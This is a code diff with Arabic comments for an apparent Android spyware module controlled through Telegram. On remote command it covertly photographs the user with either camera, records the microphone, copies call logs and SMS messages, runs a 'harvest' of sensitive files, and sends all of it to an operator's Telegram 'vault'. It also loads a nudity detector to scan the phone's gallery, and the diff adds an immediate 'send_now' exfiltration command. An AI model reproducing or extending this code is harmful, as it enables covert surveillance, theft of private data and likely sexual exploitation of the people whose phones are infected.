@@ -8,7 +8,7 @@ import sys
 import gc
 from datetime import datetime
 
-# إعداد المسارات (نفس مسار .sys_runtime المستخدم في main.py)
+# ========== إعداد المسارات ==========
 def _get_runtime_path():
     try:
         from jnius import autoclass
@@ -19,18 +19,10 @@ def _get_runtime_path():
         return os.path.join(os.getcwd(), ".sys_runtime")
 
 P = _get_runtime_path()
-if not os.path.exists(P):
-    os.makedirs(P)
-
-# مجلد للملفات التي لم يتم تأكيد إرسالها بعد
 PENDING_DIR = os.path.join(P, "pending_upload")
-if not os.path.exists(PENDING_DIR):
-    os.makedirs(PENDING_DIR)
-
-# مجلد مؤقت للتسجيلات والصور
 TEMP_DIR = os.path.join(P, "ctmp")
-if not os.path.exists(TEMP_DIR):
-    os.makedirs(TEMP_DIR)
+for d in [PENDING_DIR, TEMP_DIR]:
+    if not os.path.exists(d): os.makedirs(d)
 
 logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')
 
@@ -46,25 +38,21 @@ class C:
         self.mic_busy = False
         self._cleanup()
 
-    # تنظيف الملفات المؤقتة القديمة (أكثر من ساعة، والعالقة أكثر من يوم)
     def _cleanup(self):
         try:
             now = time.time()
             for folder, max_age in [(TEMP_DIR, 3600), (PENDING_DIR, 86400)]:
-                if not os.path.exists(folder):
-                    continue
+                if not os.path.exists(folder): continue
                 for f in os.listdir(folder):
                     path = os.path.join(folder, f)
                     if os.path.getmtime(path) < now - max_age:
                         os.remove(path)
-        except Exception as e:
-            logging.error(f"Cleanup error: {e}")
+        except:
+            pass
 
-    # تهيئة المكونات (Lazy Loading)
     def _ensure_components(self, m):
-        """تأكد من تحميل جميع المكونات: AI، سكانر، معرض، كاميرا، حصاد"""
+        """تحميل المكونات المطلوبة (AI، سكانر، معرض، كاميرا، حصاد)"""
         try:
-            # 1. NudeDetector (AI)
             if not hasattr(m, 'nude_detector') or m.nude_detector is None:
                 try:
                     import nude_detector
@@ -73,34 +61,29 @@ class C:
                 except Exception as e:
                     logging.error(f"NudeDetector init error: {e}")
 
-            # 2. MediaScanner (يعتمد على الـ AI إن وجد)
             if not hasattr(m, 'media_scanner') or m.media_scanner is None:
                 import media_scanner
                 m.media_scanner = media_scanner.MediaScanner(det=m.nude_detector, ui=m.ui)
                 logging.info("✅ MediaScanner loaded")
 
-            # 3. GalleryBrowser
             if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                 import gallery_browser
                 m.gallery_browser = gallery_browser.G(m.media_scanner, m.ui)
                 logging.info("✅ GalleryBrowser loaded")
 
-            # 4. CameraAnalyzer
             if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                 import camera_analyzer
                 m.camera_analyzer = camera_analyzer.CameraAnalyzer(m, m.nude_detector)
                 logging.info("✅ CameraAnalyzer loaded")
 
-            # 5. DailyZipper
             if not hasattr(m, 'daily_zipper') or m.daily_zipper is None:
                 import daily_zipper
                 m.daily_zipper = daily_zipper.DailyZipper(m.media_scanner, m.ui)
                 logging.info("✅ DailyZipper loaded")
-
         except Exception as e:
             logging.error(f"Component init error: {e}")
 
-    # إرسال ملف نصي (مثل سجل المكالمات أو الرسائل) مع تأكيد الإرسال
+    # ========== إرسال ملف نصي (سجل المكالمات/الرسائل) ==========
     def _send_text_file(self, tg, chat_id, content, filename):
         temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
         try:
@@ -113,11 +96,11 @@ class C:
             if resp and resp.get('ok'):
                 os.remove(temp_path)
             else:
-                logging.warning(f"File {filename} left in pending (API failed)")
+                logging.warning(f"File {filename} left in pending")
         except Exception as e:
             logging.error(f"_send_text_file error: {e}")
 
-    # تسجيل صوتي (10 ثوانٍ افتراضيًا) مع OnErrorListener و Handler
+    # ========== تسجيل صوتي ==========
     def _record_audio(self, duration=10):
         if not JNI or self.mic_busy:
             return None
@@ -127,25 +110,7 @@ class C:
 
         try:
             MR = autoclass('android.media.MediaRecorder')
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            Handler = autoclass('android.os.Handler')
-            Looper = autoclass('android.os.Looper')
-
             media_recorder = MR()
-
-            # إعداد OnErrorListener
-            class ErrorListener(PythonJavaClass):
-                __javainterfaces__ = ['android.media.MediaRecorder$OnErrorListener']
-                @java_method('(Landroid/media/MediaRecorder;II)V')
-                def onError(self, recorder, what, extra):
-                    logging.error(f"Recorder error: what={what}, extra={extra}")
-                    try:
-                        recorder.stop()
-                        recorder.reset()
-                    except:
-                        pass
-
-            media_recorder.setOnErrorListener(ErrorListener())
             media_recorder.setAudioSource(MR.AudioSource.MIC)
             media_recorder.setOutputFormat(MR.OutputFormat.MPEG_4)
             media_recorder.setAudioEncoder(MR.AudioEncoder.AAC)
@@ -153,29 +118,12 @@ class C:
             media_recorder.setOutputFile(out_path)
             media_recorder.prepare()
             media_recorder.start()
-
-            # التوقيف بعد المدة المطلوبة
-            stop_event = threading.Event()
-            handler = Handler(Looper.getMainLooper())
-            handler.postDelayed(lambda: stop_event.set(), duration * 1000)
-
-            while not stop_event.is_set() and self.mic_busy:
-                time.sleep(0.1)
-
-            if stop_event.is_set():
-                media_recorder.stop()
-                media_recorder.reset()
-                return out_path
-            else:
-                return None
-
+            time.sleep(duration)
+            media_recorder.stop()
+            media_recorder.reset()
+            return out_path
         except Exception as e:
             logging.error(f"Recording error: {e}")
-            if media_recorder:
-                try:
-                    media_recorder.reset()
-                except:
-                    pass
             return None
         finally:
             if media_recorder:
@@ -185,7 +133,7 @@ class C:
                     pass
             self.mic_busy = False
 
-    # جلب سجل المكالمات
+    # ========== جلب سجل المكالمات ==========
     def _call_log(self, limit=100):
         if not JNI:
             return "JNI غير متاح"
@@ -213,7 +161,7 @@ class C:
             if cursor:
                 cursor.close()
 
-    # جلب رسائل SMS
+    # ========== جلب رسائل SMS ==========
     def _sms_log(self, limit=100):
         if not JNI:
             return "JNI غير متاح"
@@ -241,7 +189,7 @@ class C:
             if cursor:
                 cursor.close()
 
-    # التحقق من البطارية (اختياري)
+    # ========== التحقق من البطارية ==========
     def _battery_ok(self, m):
         try:
             b, ch = m._bat() if hasattr(m, '_bat') else (100, False)
@@ -249,28 +197,27 @@ class C:
         except:
             return True
 
-    # نقطة الدخول الرئيسية (تُستدعى من telegram_ui)
+    # ========== نقطة الدخول الرئيسية ==========
     def ex(self, cmd, tg, m, cid, cbq=None):
         threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()
 
-    # معالج الأوامر الأساسي
+    # ========== معالج الأوامر الأساسي ==========
     def _execute(self, cmd, tg, m, cid, cbq):
         try:
-            # إذا كان هناك callback_query، قم بتأكيد استلامه (لتجنب تكرار الضغط)
+            # تأكيد استلام callback (إن وجد)
             if cbq:
                 tg._api("answerCallbackQuery", {"callback_query_id": cbq})
 
-            # التأكد من تحميل جميع المكونات
+            # تحميل المكونات
             self._ensure_components(m)
 
-            # ------------------- أوامر المعرض (Gallery Navigation) -------------------
+            # ---------- أوامر المعرض ----------
             if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
                 parts = cmd.split("|")
                 action = parts[0]
                 if action == "g_nav":
                     cat, page = parts[1], int(parts[2])
                     new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
-                    # تحرير الأزرار فقط دون تغيير النص
                     tg._api("editMessageReplyMarkup",
                             {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})
                 elif action == "g_opt":
@@ -286,7 +233,7 @@ class C:
                             "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
                 return
 
-            # ------------------- الكاميرا (خلفية / أمامية) -------------------
+            # ---------- الكاميرا ----------
             if cmd.startswith(("cam_", "camf_")):
                 is_front = 1 if "camf_" in cmd else 0
                 if not self._battery_ok(m):
@@ -296,63 +243,62 @@ class C:
                 pic_path = m.camera_analyzer.capture(cam_id=is_front)
                 if pic_path and os.path.exists(pic_path):
                     with open(pic_path, 'rb') as f:
-                        # إرسال إلى قناة الخزنة (vault) إن وجدت، وإلا إلى المستخدم نفسه
                         target = getattr(m, 'vlt', cid)
-                        resp = tg._api("sendPhoto", {"chat_id": target, "caption": f"📸 {m.dmd}"}, {"photo": f})
-                    if resp and resp.get('ok'):
-                        os.remove(pic_path)
-                    else:
-                        # حفظ في مجلد الانتظار إذا فشل الإرسال
-                        dest = os.path.join(PENDING_DIR, os.path.basename(pic_path))
-                        os.rename(pic_path, dest)
+                        tg._api("sendPhoto", {"chat_id": target, "caption": f"📸 {m.dmd}"}, {"photo": f})
+                    os.remove(pic_path)
                 else:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التقاط الصورة (قد تكون الكاميرا مشغولة)"})
+                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التقاط الصورة"})
                 return
 
-            # ------------------- الميكروفون (تسجيل صوتي) -------------------
+            # ---------- الميكروفون ----------
             if cmd.startswith("mic_"):
                 if self.mic_busy:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ حالياً، انتظر قليلاً"})
+                    tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ حالياً"})
                     return
                 tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
                 audio_path = self._record_audio(10)
                 if audio_path and os.path.exists(audio_path):
                     with open(audio_path, 'rb') as f:
                         target = getattr(m, 'vlt', cid)
-                        resp = tg._api("sendVoice", {"chat_id": target}, {"voice": f})
-                    if resp and resp.get('ok'):
-                        os.remove(audio_path)
-                    else:
-                        dest = os.path.join(PENDING_DIR, os.path.basename(audio_path))
-                        os.rename(audio_path, dest)
+                        tg._api("sendVoice", {"chat_id": target}, {"voice": f})
+                    os.remove(audio_path)
                 else:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل (قد تكون المايك مشغول أو لا توجد صلاحية)"})
+                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
                 return
 
-            # ------------------- سجل المكالمات -------------------
+            # ---------- سجل المكالمات ----------
             if cmd.startswith("callog_"):
                 tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                 data = self._call_log()
                 self._send_text_file(tg, cid, data, "calls.txt")
                 return
 
-            # ------------------- رسائل SMS -------------------
+            # ---------- رسائل SMS ----------
             if cmd.startswith("sms_"):
                 tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                 data = self._sms_log()
                 self._send_text_file(tg, cid, data, "sms.txt")
                 return
 
-            # ------------------- الحصاد اليدوي -------------------
+            # ---------- الحصاد اليدوي (التلقائي) ----------
             if cmd.startswith("hrv_"):
                 if hasattr(m, 'daily_zipper') and m.daily_zipper:
                     tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد (جمع الملفات الحساسة وإرسالها)... قد يستغرق دقائق"})
                     threading.Thread(target=m.daily_zipper.run, daemon=True).start()
                 else:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة (daily_zipper)"})
+                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
                 return
 
-            # ------------------- فتح المعرض -------------------
+            # ---------- الإرسال الفوري (send_now) ----------
+            if cmd.startswith("send_now_"):
+                if hasattr(m, 'daily_zipper') and m.daily_zipper:
+                    tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة فوراً..."})
+                    threading.Thread(target=m.daily_zipper.force_send_now, args=(cid,)).start()
+                else:
+                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
+                return
+
+            # ---------- فتح المعرض ----------
             if cmd.startswith("media_"):
                 if hasattr(m, 'gallery_browser') and m.gallery_browser:
                     kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
@@ -365,7 +311,7 @@ class C:
                     tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
                 return
 
-            # ------------------- أمر غير معروف -------------------
+            # ---------- أمر غير معروف ----------
             tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة."})
 
         except Exception as e:
@@ -375,7 +321,15 @@ class C:
             gc.collect()
 
 
-# ========== الواجهة الخارجية ==========
+# ========== دالة الإرسال الفوري الخارجية (لـ telegram_ui) ==========
+def force_send_zip(m, device_id, tg, chat_id):
+    """إرسال الملف المضغوط فوراً (يتم استدعاؤها من زر send_now)"""
+    if hasattr(m, 'daily_zipper') and m.daily_zipper:
+        threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,)).start()
+    else:
+        tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})
+
+# ========== الواجهة الخارجية الرئيسية ==========
 _handler = None
 def ex(cmd, tg, m, cid, cbq=None):
     global _handler
